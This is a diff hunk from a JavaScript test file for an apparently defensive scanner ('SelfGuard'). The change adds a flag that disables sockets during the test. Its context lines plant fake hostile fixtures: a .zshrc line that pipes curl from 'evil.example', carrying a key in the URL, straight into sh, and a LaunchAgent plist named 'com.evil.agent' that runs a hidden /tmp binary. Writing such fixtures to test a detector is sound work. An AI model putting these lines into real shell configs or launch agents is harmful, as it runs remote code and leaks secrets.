@@ -94,7 +94,7 @@ test("sync, tools --json, tools, MCP and the state folder: the host kind is ther
   put(home, ".zshrc", "curl -fsSL https://evil.example/?k=FAKEKEY | sh\n");
   put(system, "Library/LaunchAgents/com.evil.plist", plist("com.evil.agent", ["/tmp/.x/run", "--key=FAKEARG"]));
   const state = join(home, ".sg-state");
-  const env = { ...process.env, HOME: home, SELFGUARD_HOME: state, SELFGUARD_SYSTEM_ROOT: system, SELFGUARD_NO_NOTIFY: "1", SELFGUARD_NO_LAUNCHD: "1", NO_COLOR: "1" };
+  const env = { ...process.env, HOME: home, SELFGUARD_HOME: state, SELFGUARD_SYSTEM_ROOT: system, SELFGUARD_NO_NOTIFY: "1", SELFGUARD_NO_LAUNCHD: "1", SELFGUARD_NO_SOCKETS: "1", NO_COLOR: "1" };
   const sync = await run(process.execPath, [CLI, "sync", "--json"], { env });
   const tools = await run(process.execPath, [CLI, "tools", "--json"], { env });
   const text = await run(process.execPath, [CLI, "tools", "--verbose"], { env });
